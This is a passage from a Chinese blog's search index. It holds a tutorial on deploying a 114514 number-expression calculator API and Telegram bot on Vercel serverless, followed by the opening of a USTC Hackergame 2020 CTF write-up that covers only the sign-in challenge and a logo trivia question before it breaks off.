<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>基于Vercel Serverless部署Calc114514 API &amp; Telegram bot</title>
      <link href="/2020/11/18/Server_Vercel_Calc114514/"/>
      <url>/2020/11/18/Server_Vercel_Calc114514/</url>
      
        <content type="html"><![CDATA[<h2 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h2><p>最近，受到 USTC Hackergame 2020（中国科学技术大学第七届信息安全大赛）超精巧的数字论证器 一题启发，寻思着咱可以整一个网页版本 / Telegram bot 版本的 114514 数字论证器。</p><blockquote><p>BTW, <a href="https://miaotony.xyz/2020/11/08/CTF_2020Hackergame/">USTC Hackergame 2020 WriteUp by MiaoTony</a></p></blockquote><p>说干就干，考虑到 Vercel 有个 Serverless Function 服务，之前也尝试过在上面搭 API<em>（虽然那时由于执行时间限制等原因没用上）</em>，这次的 114514 论证实际上并不复杂，于是就来整一个吧！</p><p><em>（Serverless 真香！</em></p><hr><h2 id="0x01-TL-DR"><a href="#0x01-TL-DR" class="headerlink" title="0x01 TL; DR"></a>0x01 TL; DR</h2><p>直接说<strong>如何体验</strong>，具体如何实现后面再展开。</p><p>前后端分离，均部署在 Vercel。</p><p><strong>前端：</strong><a href="https://calc114514.vercel.app/?from=blog" target="_blank" rel="noopener">https://calc114514.vercel.app/</a></p><p><strong>Telegram bot:</strong> <a href="https://t.me/calc114514bot" target="_blank" rel="noopener">@calc114514bot</a>.</p><p>项目开源在 GitHub 上：<a href="https://github.com/miaotony/calc114514" target="_blank" rel="noopener">https://github.com/miaotony/calc114514</a></p><p><strong>欢迎来点个 Star 喵~</strong></p><h3 id="API-开放接口"><a href="#API-开放接口" class="headerlink" title="API 开放接口"></a>API 开放接口</h3><blockquote><p><strong>GET / POST</strong> <a href="https://calc114514.vercel.app/api/calc" target="_blank" rel="noopener">https://calc114514.vercel.app/api/calc</a></p></blockquote><p><strong>Param:</strong></p><p><code>num</code> a number here.</p><p><code>isJson</code> Optional. If <code>1</code>, return the result(s) with <code>JSON</code> format, else return <code>text/plain</code> result.</p><p><strong>Return:</strong></p><p>See examples below.</p><p><strong>Examples:</strong></p><pre class=" language-bash"><code class="language-bash">$ curl <span class="token string">"https://calc114514.vercel.app/api/calc?num=114514"</span>-~-~-~-~<span class="token punctuation">(</span>-~<span class="token punctuation">(</span>-~-~-~-~-~<span class="token punctuation">(</span>-~-~-~-~<span class="token punctuation">(</span>-~<span class="token punctuation">(</span>-~~-1*-~-~-~-~-~-~-~-~-~1<span class="token punctuation">)</span>*-~-~-~-~-~-~4<span class="token punctuation">)</span>*-~-~-~-~-~5<span class="token punctuation">)</span>*-~-~-~-~-~-~-~-~-~1<span class="token punctuation">)</span>*-~-~-~-~-~-~4<span class="token punctuation">)</span>$ curl <span class="token string">"https://calc114514.vercel.app/api/calc?isJson=1&amp;num=114514"</span><span class="token punctuation">{</span><span class="token string">"answer"</span><span class="token keyword">:</span><span class="token string">"-~-~-~-~(-~(-~-~-~-~-~(-~-~-~-~(-~(-~~-1*-~-~-~-~-~-~-~-~-~1)*-~-~-~-~-~-~4)*-~-~-~-~-~5)*-~-~-~-~-~-~-~-~-~1)*-~-~-~-~-~-~4)"</span>,<span class="token string">"number"</span><span class="token keyword">:</span><span class="token string">"114514"</span><span class="token punctuation">}</span></code></pre><h3 id="Telegram-bot"><a href="#Telegram-bot" class="headerlink" title="Telegram bot"></a>Telegram bot</h3><p>See <a href="https://t.me/calc114514bot" target="_blank" rel="noopener">@calc114514bot</a>.</p><p><strong>Usage:</strong></p><ol><li>Send a number to @calc114514bot. 直接给机器人发数字。</li><li>Use inline query method, <code>@calc114514bot &lt;Number Here&gt;</code> . 在任意的输入框输入 <code>@calc114514bot 你想论证的数字</code>。</li></ol><p><img src="/2020/11/18/Server_Vercel_Calc114514/image-20201112224730824.png" alt="Inline query"></p><p>第一个不带原数，第二个带原数，效果分别如下所示。</p><p><img src="/2020/11/18/Server_Vercel_Calc114514/image-20201112224905498.png" alt=""></p><hr><h2 id="0x02-题目回顾"><a href="#0x02-题目回顾" class="headerlink" title="0x02 题目回顾"></a>0x02 题目回顾</h2><blockquote><p>数字论证是一种常见的定理证明方法。</p><p>简单来说，就是对于给定的自然数，找出一个等值的表达式，如果该表达式去除所有符号部分后为字符串「114514」，则完成论证。表达式仅允许整数运算，可以使用括号、常见的代数运算符 <code>+-*/%</code> 和位运算符 <code>~^&amp;|</code>。</p><p><em>Via: USTC Hackergame 2020</em></p></blockquote><p>Calculate a number with <code>114514</code> &amp; some operators.</p><p>于是我们就需要利用 <code>114514</code> 及<strong>一些运算符</strong>构造出所给的数字。</p><p><strong>See also:</strong>  <a href="https://github.com/USTC-Hackergame/hackergame2020-writeups/blob/master/official/超精巧的数字论证器/README.md" target="_blank" rel="noopener">超精巧的数字论证器 (official writeup)</a></p><hr><h2 id="0x03-Demonstration-method-论证算法"><a href="#0x03-Demonstration-method-论证算法" class="headerlink" title="0x03 Demonstration method  论证算法"></a>0x03 Demonstration method  论证算法</h2><h3 id="六位数以内论证方法"><a href="#六位数以内论证方法" class="headerlink" title="六位数以内论证方法"></a>六位数以内论证方法</h3><p>在不超过6位数，即 <code>0 &lt;= num &lt;= 999999</code> 的论证上，参考了 <a href="https://github.com/USTC-Hackergame/hackergame2020-writeups/blob/master/official/超精巧的数字论证器/README.md" target="_blank" rel="noopener">官方 WriteUp</a> 里的算法。</p><p><strong>重要性质：</strong></p><p><code>-~x == x+1</code><br><code>~-x == x-1</code> 对于任意 <code>x</code> 都成立。</p><blockquote><p>一个办法就是<strong>按照十进制的方式来凑</strong>，即 <code>given_number = (((((((0+a)*10+b)*10+c)*10+d)*10)+e)*10)+f</code> ，其中 <code>a b c d e f</code> 为 0 到 9 之间的整数。表达式中的值 <code>0 10 10 10 10 10</code> 可以分别利用 <code>1 1 4 5 1 4</code> 与嵌套 <code>~-</code> 来凑出，而 <code>+a +b +c +d +e +f</code> 可以直接利用嵌套 <code>~-</code> 来实现（不需要使用数字）。</p></blockquote><pre class=" language-python"><code class="language-python"><span class="token keyword">def</span> <span class="token function">getans</span><span class="token punctuation">(</span>number<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token triple-quoted-string string">"""    Get the answer using `114514` &amp; `-~`, `~-`.    参考官方 WriteUp，基于十进制分解实现，支持6位及以下数字    """</span>    jz <span class="token operator">=</span> <span class="token number">10</span>    s <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span>    e <span class="token operator">=</span> <span class="token string">"114514"</span>    <span class="token keyword">for</span> c <span class="token keyword">in</span> e<span class="token punctuation">[</span><span class="token punctuation">:</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">:</span>        s<span class="token punctuation">.</span>append<span class="token punctuation">(</span><span class="token string">"~-"</span> <span class="token operator">*</span> <span class="token punctuation">(</span>int<span class="token punctuation">(</span>c<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">+</span> c<span class="token punctuation">)</span>  <span class="token comment" spellcheck="true"># value is zero</span>    <span class="token keyword">for</span> c <span class="token keyword">in</span> e<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">:</span><span class="token punctuation">]</span><span class="token punctuation">:</span>        s<span class="token punctuation">.</span>append<span class="token punctuation">(</span><span class="token string">"-~"</span> <span class="token operator">*</span> <span class="token punctuation">(</span>jz <span class="token operator">-</span> int<span class="token punctuation">(</span>c<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">+</span> c<span class="token punctuation">)</span>  <span class="token comment" spellcheck="true"># value is jz</span>    ans <span class="token operator">=</span> <span class="token string">""</span>    <span class="token keyword">for</span> i <span class="token keyword">in</span> range<span class="token punctuation">(</span>len<span class="token punctuation">(</span>e<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        digit <span class="token operator">=</span> <span class="token punctuation">(</span>number <span class="token operator">//</span> <span class="token punctuation">(</span>jz <span class="token operator">**</span> <span class="token punctuation">(</span>len<span class="token punctuation">(</span>e<span class="token punctuation">)</span> <span class="token operator">-</span> <span class="token number">1</span> <span class="token operator">-</span> i<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">%</span> jz        ans <span class="token operator">=</span> <span class="token string">"("</span> <span class="token operator">+</span> ans <span class="token operator">+</span> <span class="token string">"*"</span> <span class="token operator">+</span> s<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">+</span> <span class="token string">")"</span> <span class="token keyword">if</span> i <span class="token operator">></span> <span class="token number">0</span> <span class="token keyword">else</span> s<span class="token punctuation">[</span>i<span class="token punctuation">]</span>        ans <span class="token operator">=</span> <span class="token string">"-~"</span> <span class="token operator">*</span> digit <span class="token operator">+</span> ans    <span class="token keyword">return</span> ans</code></pre><h3 id="超过六位数的论证方法"><a href="#超过六位数的论证方法" class="headerlink" title="超过六位数的论证方法"></a>超过六位数的论证方法</h3><p>对于所给整数<code>n</code>，采用与十进制类似的方法，在 $ n^{1/6} $ 附近取六个数，每位取不同进制，最后再凑到所给的数。</p><p><em>（TODO）</em></p><hr><h2 id="0x04-部署-API-接口"><a href="#0x04-部署-API-接口" class="headerlink" title="0x04 部署 API 接口"></a>0x04 部署 API 接口</h2><p>其实写个接口的话并不难，个人习惯就使用 Python3 及 Flask 进行开发了。</p><p>简单地说，就是把路由配好，所需的参数传进来，丢到处理的函数里，把结果再按照需求返回给用户就完事了。</p><p>但是又不想为了这玩意儿就整个服务器，也懒得运维，于是想到了以 Serverless 无服务器 的形式进行部署。</p><p>常见的 Serverless 服务也挺多，比如 AWS Lambda, Heroku, Cloudflare Workers, Vercel, etc.</p><p>这里就用 <strong>Vercel</strong> 来实现吧。</p><h3 id="Vercel-介绍"><a href="#Vercel-介绍" class="headerlink" title="Vercel 介绍"></a>Vercel 介绍</h3><blockquote><p>Vercel is the optimal workflow for frontend teams. All-in-one: Static and Jamstack deployment, Serverless Functions, and Global CDN.</p><p>Vercel is a cloud platform for <strong>static sites</strong> and <strong>Serverless Functions</strong> that fits perfectly with your workflow. It enables developers to host Jamstack websites and web services that deploy instantly, scale automatically, and requires no supervision, all with no configuration.</p></blockquote><p>官网就是 <a href="https://vercel.com" target="_blank" rel="noopener">https://vercel.com</a></p><p>它是一个提供了静态资源和 Serverless 函数服务的云平台，可以在同一个网站上进行部署。</p><p>对于 Vue.js / Next.js / Hexo / Hugo / … 等等主流前端框架，你只需要把原始代码上传，指定好依赖，它就能帮你构建静态文件，自动完成部署。</p><p>它支持 GitHub、GitLab 和 Bitbucket 集成，也支持通过命令行 CLI 工具进行部署。</p><p>而且 <a href="https://vercel.com/pricing" target="_blank" rel="noopener">个人版本是永远免费的</a>！<a href="https://vercel.com/docs/platform/limits" target="_blank" rel="noopener">平台限制</a> 也很宽裕。</p><p>更多介绍详见 <a href="https://vercel.com/docs/introduction" target="_blank" rel="noopener">官方介绍文档</a>。</p><p>Vercel 就是之前的 ZEIT，其命令行工具就是 <code>vercel</code>，以前是 <code>now</code>。</p><p>首先我们安装命令行工具。</p><pre class=" language-bash"><code class="language-bash"><span class="token function">npm</span> i -g vercel</code></pre><p>看一下版本。</p><pre class=" language-bash"><code class="language-bash">$ vercel --versionVercel CLI 20.1.420.1.4</code></pre><p>初次使用需要登录，输入邮箱，而后点击邮件里的链接进行授权。</p><pre class=" language-bash"><code class="language-bash">vercel login</code></pre><p>若直接部署当前文件夹，直接在命令行输入</p><pre class=" language-bash"><code class="language-bash">vercel</code></pre><p>而后按照提示进行操作即可。</p><p>其中会询问你项目名称，首次部署时会以此给你分配一个 <code>*.vercel.app</code> 之类的免费域名，这个对应着生产环境。而 <code>*.&lt;username&gt;.vercel.app</code> 则对应着 预览环境/开发环境 (preview)。</p><p>之后的每一次部署都会部署到 Preview 环境，确定没问题后再用下面的命令部署到生产环境即可。</p><pre class=" language-bash"><code class="language-bash">vercel --prod</code></pre><p>两个环境分离开来就很好用，赞一个。</p><p>当然 Vercel 还支持绑定自己的域名，只需要改一改 CNAME 就好，还能帮你配上 Let’s encrypt! 的证书。</p><p>除此之外，也可以直接在 Settings 下的 Tokens 里新建一个 token，利用其来进行部署。</p><p><img src="/2020/11/18/Server_Vercel_Calc114514/image-20201119010712433.png" alt="token"></p><pre class=" language-bash"><code class="language-bash">vercel -t <span class="token operator">&lt;</span>TOKEN Here<span class="token operator">></span></code></pre><p>这一操作很适合在服务器上执行，以及可以白嫖 CI 进行部署（嘿嘿，可以在 Organization 里进行构建了</p><p>更多 CLI 使用方法可以参考 <a href="https://vercel.com/docs/cli#commands/overview" target="_blank" rel="noopener">官方 Reference</a>。</p><h3 id="Serverless-部署"><a href="#Serverless-部署" class="headerlink" title="Serverless 部署"></a>Serverless 部署</h3><p>下面就到了愉快的 Serverless 部署环节了。</p><p>参考 <a href="https://vercel.com/docs/serverless-functions/introduction#" target="_blank" rel="noopener">Serverless Functions 官方文档</a>，我们需要新建一个 <code>api</code> 文件夹，在里面放我们的代码。</p><p>目前支持的后端语言包括：</p><ul><li><a href="https://vercel.com/docs/serverless-functions/supported-languages#node.js" target="_blank" rel="noopener">Node.js</a></li><li><a href="https://vercel.com/docs/serverless-functions/supported-languages#go" target="_blank" rel="noopener">Go</a></li><li><a href="https://vercel.com/docs/serverless-functions/supported-languages#python" target="_blank" rel="noopener">Python</a></li><li><a href="https://vercel.com/docs/serverless-functions/supported-languages#ruby" target="_blank" rel="noopener">Ruby</a></li></ul><p>我这里使用的感觉的话，JS支持最好，毕竟自家有 Next.js。</p><p>而 Python 的话其实支持并没有那么好，于是就遇到了一些问题。。</p><blockquote><p>Python files within the <code>api</code> directory, containing an handler variable that inherits from the <code>BaseHTTPRequestHandler</code> class or an <code>app</code> variable that exposes a WSGI or ASGI application, will be served as Serverless Functions.</p></blockquote><p>比如路由问题，它默认是一个文件对应一个路由，即其文件名就是其路由。</p><p>但这不合适，我们这里是在一个 py 文件里通过 Flask 来处理路由，暴露一个 <code>app</code> 对象。于是需要自己配置一下。</p><p>在 <code>api</code> 外面的目录下新建一个 <code>vercel.json</code> 文件，在里面进行配置。</p><p>参考 <a href="https://vercel.com/docs/configuration#introduction/configuration-reference" target="_blank" rel="noopener">Configuration Reference</a>，我这里把 <code>/api(.*)</code> 都交给 <code>api/main.py</code> 文件进行处理，这样就能解决路由问题。</p><pre class=" language-json"><code class="language-json"><span class="token punctuation">{</span>    <span class="token property">"version"</span><span class="token operator">:</span> <span class="token number">2</span><span class="token punctuation">,</span>    <span class="token property">"routes"</span><span class="token operator">:</span> <span class="token punctuation">[</span><span class="token punctuation">{</span>        <span class="token property">"headers"</span><span class="token operator">:</span> <span class="token punctuation">{</span>            <span class="token property">"Access-Control-Allow-Origin"</span><span class="token operator">:</span> <span class="token string">"*"</span>        <span class="token punctuation">}</span><span class="token punctuation">,</span>        <span class="token property">"src"</span><span class="token operator">:</span> <span class="token string">"/api(.*)"</span><span class="token punctuation">,</span>        <span class="token property">"dest"</span><span class="token operator">:</span> <span class="token string">"api/main.py"</span><span class="token punctuation">,</span>        <span class="token property">"continue"</span><span class="token operator">:</span> <span class="token boolean">true</span>    <span class="token punctuation">}</span><span class="token punctuation">]</span><span class="token punctuation">}</span></code></pre><p>同时要注意的是，<code>main.py</code> 里的路由也需要包含 <code>/api</code>，例如</p><pre class=" language-python"><code class="language-python">@app<span class="token punctuation">.</span>route<span class="token punctuation">(</span><span class="token string">'/api/calc'</span><span class="token punctuation">,</span> methods<span class="token operator">=</span><span class="token punctuation">[</span><span class="token string">'GET'</span><span class="token punctuation">,</span> <span class="token string">'POST'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">api_calc</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token triple-quoted-string string">"""    Calculate 114514 API    """</span>    <span class="token keyword">pass</span></code></pre><hr><h2 id="0x05-部署-Telegram-bot"><a href="#0x05-部署-Telegram-bot" class="headerlink" title="0x05 部署 Telegram bot"></a>0x05 部署 Telegram bot</h2><p><strong>Telegram bot 才是这次的重点。</strong></p><p>由于 Telegram 给我们提供了 <strong>Webhook</strong> 这种处理消息的方式，当 bot 接收到用户发来的消息后，Telegram 服务器会给你设置 Webhook 的 URI 发一个 POST 请求，对这个包进行提取就能得到用户的消息等信息。进而对数据进行处理，再通过 TG bot 的 API 给用户回复消息就完事了。</p><p>首先需要设置好 Webhook 到 Vercel 的 URI 上，利用 Flask 的路由去接收。略了。</p><p>而处理消息的部分，这里在写的时候最开始是想自己写的，毕竟并不复杂，它送来的是个 JSON 格式字符串，提取一下就完事了。</p><p>但是主要想实现一个内联查询（inline query）的功能，同时还要兼顾消息回复，就觉得有点麻烦，还不如用现成的轮子，懒得造轮子了。</p><p>去 GitHub 上搜了一下，发现有两大现成轮子：<strong><a href="https://github.com/python-telegram-bot/python-telegram-bot" target="_blank" rel="noopener">python-telegram-bot</a></strong> 及 <strong><a href="https://github.com/eternnoir/pyTelegramBotAPI" target="_blank" rel="noopener">pyTelegramBotAPI</a></strong>。</p><p>他们的文档都挺丰富的，也有很多例子。主要就是对官方的 HTTP API 接口进行了封装，处理消息上好像还做了个队列，用了异步实现的感觉。</p><p>其中前者本身带有一个 webhook 服务器，但试了发现不符合 Vercel 的要求，没有暴露 <code>app</code> 对象之类的。</p><p>后者则提供了一个 heroku 部署的样例 pyTelegramBotAPI/examples/webhook_examples/<a href="https://github.com/eternnoir/pyTelegramBotAPI/blob/master/examples/webhook_examples/webhook_flask_heroku_echo.py" target="_blank" rel="noopener">webhook_flask_heroku_echo.py</a>  </p><p><strong>关键代码：</strong></p><pre class=" language-python"><code class="language-python">@server<span class="token punctuation">.</span>route<span class="token punctuation">(</span><span class="token string">'/'</span> <span class="token operator">+</span> TOKEN<span class="token punctuation">,</span> methods<span class="token operator">=</span><span class="token punctuation">[</span><span class="token string">'POST'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">getMessage</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    bot<span class="token punctuation">.</span>process_new_updates<span class="token punctuation">(</span><span class="token punctuation">[</span>telebot<span class="token punctuation">.</span>types<span class="token punctuation">.</span>Update<span class="token punctuation">.</span>de_json<span class="token punctuation">(</span>request<span class="token punctuation">.</span>stream<span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token string">"utf-8"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">]</span><span class="token punctuation">)</span>    <span class="token keyword">return</span> <span class="token string">"!"</span><span class="token punctuation">,</span> <span class="token number">200</span></code></pre><p><code>process_new_updates</code> 这个方法能把接收到的信息传进去，从而建立了 Webhook 和 pyTelegramBotAPI 的联系。</p><p>于是就用 pyTelegramBotAPI 这个来实现了。</p><p>还有一个坑就是，可能是由于异步处理消息的原因，Vercel Serverless 中的 <code>process_new_updates</code> 结束 return 之后，消息还来不及处理完回送给 Telegram，在测试过程中经常就消息莫名其妙丢失了，或者连着发几条消息才回复的情况。</p><p>后来尝试了加一个 <code>bot.get_me()</code> 来缓解。</p><p>再后来，发现直接加个延时就完事了，<code>time.sleep(0.5)</code>，只需要 0.5s 延时，简单粗暴解决问题。</p><p>（喵喵~</p><p>相关代码位于 GitHub repo <a href="https://github.com/miaotony/calc114514" target="_blank" rel="noopener">https://github.com/miaotony/calc114514</a> 的 <code>/api/</code> 目录下，<code>main.py</code> 内包含了开放接口和 bot 交互的相关接口。</p><h3 id="开发说明"><a href="#开发说明" class="headerlink" title="开发说明"></a><strong>开发说明</strong></h3><ol><li><p>Install the requirements.</p><pre><code>pip3 install -r requirements.txt</code></pre></li><li><p>Edit your Telegram bot token and Webhook URL path in the <code>secret.example.py</code>.</p></li><li><p>Rename <code>secret.example.py</code> to <code>secret.py</code>.</p></li><li><p>Run the backend, for example, <code>gunicorn main:app</code>.</p></li></ol><p><strong>基于 Vercel 部署：</strong></p><p>在配置好 <code>vercel.json</code> 和 <code>api</code> 目录的基础上，直接用 CLI 上传即可。</p><hr><h2 id="0x06-FrontEnd-前端"><a href="#0x06-FrontEnd-前端" class="headerlink" title="0x06 FrontEnd  前端"></a>0x06 FrontEnd  前端</h2><p>最后，寻思着咱 API 都弄好了，不如再整个前端界面吧。</p><p>前后端分离架构，直接调用之前写的 API 就好了。</p><p>想到 Hackergame 2020 签到题那个界面就不错，于是在此基础上魔改了一下，加了个 AJAX 网络请求，顺便做了个输入框和滑块的双向数据绑定。</p><p>本身就是个静态文件，直接基于 Vercel 完成部署就完事了。</p><p>详见： <a href="https://calc114514.vercel.app/?from=blog" target="_blank" rel="noopener">https://calc114514.vercel.app/</a></p><p><img src="/2020/11/18/Server_Vercel_Calc114514/image-20201112225921026.png" alt=""></p><p><img src="/2020/11/18/Server_Vercel_Calc114514/image-20201112225938571.png" alt="img"></p><p>BTW, 当你想要论证 114514 的时候会给你多提示个“恶臭的” <em>（嘻嘻</em></p><hr><h2 id="0x07-小结"><a href="#0x07-小结" class="headerlink" title="0x07 小结"></a>0x07 小结</h2><p>总之就是写了一大版，从论证算法到接口部署到 Telegram bot 部署再到前端界面，把整个实现的过程说了一通。</p><p><strong>前端：</strong><a href="https://calc114514.vercel.app/?from=blog" target="_blank" rel="noopener">https://calc114514.vercel.app/</a></p><p><strong>Telegram bot:</strong> <a href="https://t.me/calc114514bot" target="_blank" rel="noopener">@calc114514bot</a>.</p><p>代码开源在 GitHub 上：<a href="https://github.com/miaotony/calc114514" target="_blank" rel="noopener">https://github.com/miaotony/calc114514</a></p><p>走过路过点个 STAR 吧~</p><p>（Serverless 真香！</p><h2 id="0xFF-Extensive-Reading"><a href="#0xFF-Extensive-Reading" class="headerlink" title="0xFF Extensive Reading"></a>0xFF Extensive Reading</h2><p><a href="https://www.ixiqin.com/2020/06/how-to-free-for-your-organizations-project-configuration-vercel/" target="_blank" rel="noopener">如何免费为你的组织项目配置 Vercel</a></p><p><a href="https://www.v2ex.com/t/683606" target="_blank" rel="noopener">V2EX: 基于 Vercel 提供的 Serverless 写的服务</a></p><p><a href="https://www.xuthus.cc/go/vercel-run-go.html" target="_blank" rel="noopener">vercel无服务部署Go函数</a></p><p><em>（溜了溜了喵~</em></p><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
      
      
      <categories>
          
          <category> Tech </category>
          
          <category> Server </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Tech </tag>
            
            <tag> Telegram </tag>
            
            <tag> Server </tag>
            
            <tag> Web </tag>
            
            <tag> Serverless </tag>
            
            <tag> Vercel </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CTF | 2020 USTC Hackergame WriteUp</title>
      <link href="/2020/11/08/CTF_2020Hackergame/"/>
      <url>/2020/11/08/CTF_2020Hackergame/</url>
      
        <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>一年一度的 USTC Hackergame 又来了。</p><blockquote><p><strong>中国科学技术大学第七届信息安全大赛</strong></p><p>比赛平台：<a href="https://hack.lug.ustc.edu.cn/" target="_blank" rel="noopener">https://hack.lug.ustc.edu.cn/</a></p><p>官方 WriteUp &amp; 题目存档：<a href="https://github.com/USTC-Hackergame/hackergame2020-writeups" target="_blank" rel="noopener">https://github.com/USTC-Hackergame/hackergame2020-writeups</a></p></blockquote><p>正好这周事情不是很多，有机会来打一打玩一玩。</p><p>由于怕比赛结束再写我会咕咕咕，于是就边做题边写 WriteUp 了。</p><p>比赛结束之后又复现了几道被卡住的题这样。</p><p><em>（这篇特别长特别长特别长……</em></p><hr><h2 id="签到"><a href="#签到" class="headerlink" title="签到"></a>签到</h2><p>FLAG 提取器 还行。</p><p>（就是不想给你1个 flag 吧 233</p><pre class=" language-javascript"><code class="language-javascript"><span class="token keyword">var</span> prevVal <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token function">$</span><span class="token punctuation">(</span>document<span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">ready</span><span class="token punctuation">(</span><span class="token keyword">function</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token function">$</span><span class="token punctuation">(</span><span class="token string">"#show"</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">text</span><span class="token punctuation">(</span><span class="token function">$</span><span class="token punctuation">(</span><span class="token string">'#number'</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">.</span>value<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">$</span><span class="token punctuation">(</span><span class="token string">'#number'</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">on</span><span class="token punctuation">(</span><span class="token string">'input'</span><span class="token punctuation">,</span> <span class="token keyword">function</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">$</span><span class="token punctuation">(</span><span class="token string">'#number'</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">.</span>value<span class="token punctuation">.</span><span class="token function">toString</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">===</span> <span class="token string">"1"</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>            console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">'没想到吧!'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token function">$</span><span class="token punctuation">(</span><span class="token string">'#number'</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">.</span>value <span class="token operator">=</span> <span class="token number">1.00001</span><span class="token punctuation">;</span>            <span class="token keyword">if</span> <span class="token punctuation">(</span>prevVal <span class="token operator">==</span> <span class="token number">1.00001</span><span class="token punctuation">)</span>  <span class="token function">$</span><span class="token punctuation">(</span><span class="token string">'#number'</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">.</span>value <span class="token operator">=</span> <span class="token number">0.99999</span><span class="token punctuation">;</span>            <span class="token keyword">if</span> <span class="token punctuation">(</span>prevVal <span class="token operator">==</span> <span class="token number">0.99999</span><span class="token punctuation">)</span>  <span class="token function">$</span><span class="token punctuation">(</span><span class="token string">'#number'</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">.</span>value <span class="token operator">=</span> <span class="token number">1.00001</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>        <span class="token function">$</span><span class="token punctuation">(</span><span class="token string">"#show"</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">text</span><span class="token punctuation">(</span><span class="token function">$</span><span class="token punctuation">(</span><span class="token string">'#number'</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">.</span>value<span class="token punctuation">.</span><span class="token function">toString</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        prevVal <span class="token operator">=</span> <span class="token function">$</span><span class="token punctuation">(</span><span class="token string">'#number'</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">.</span>value<span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre><p>直接改 url 就完事了。</p><p><img src="/2020/11/08/CTF_2020Hackergame/image-20201031161040769.png" alt="signin"></p><hr><h2 id="猫咪问答"><a href="#猫咪问答" class="headerlink" title="猫咪问答++"></a>猫咪问答++</h2><ol><li><p>以下编程语言、软件或组织对应标志是哺乳动物的有几个？<br>Docker，Golang，Python，Plan  9，PHP，GNU，LLVM，Swift，Perl，GitHub，TortoiseSVN，FireFox，MySQL，PostgreSQL，MariaDB，Linux，OpenBSD，FreeDOS，Apache Tomcat，Squid，openSUSE，Kali，Xfce.<br>提示：学术上一般认为龙不属于哺乳动物。</p><p><img src="/2020/11/08/CTF_2020Hackergame/docker.jpg" alt="docker"></p><p><img src="/2020/11/08/CTF_2020Hackergame/golang.sh-600x600.png" alt="golang"></p><p><img src="/2020/11/08/CTF_2020Hackergame/python.sh-600x600.png" alt="python"></p><p><img src="/2020/11/08/CTF_2020Hackergame/095048hc2bw28c2c3yy82n.jpg" alt="Plan9bunnysmblack"></p><p><img src="/2020/11/08/CTF_2020Hackergame/php-logo.jpeg" alt="php"></p><p><img src="/2020/11/08/CTF_2020Hackergame/9922720e0cf3d7caaa2f7a06f21fbe096a63a9e1" alt="GNU"></p><p><img src="/2020/11/08/CTF_2020Hackergame/perl.jpg" alt="perl"></p><p><img src="/2020/11/08/CTF_2020Hackergame/9e3df8dcd100baa1613b79b74a10b912c8fc2ea2" alt="PostgreSQL"></p><p><img src="/2020/11/08/CTF_2020Hackergame/0dd7912397dda1447af0caafb0b7d0a20cf48636" alt="MariaDB"></p><p>……</p><p><em>不找了（懒</em></p><p>最后直接穷举了，有 12 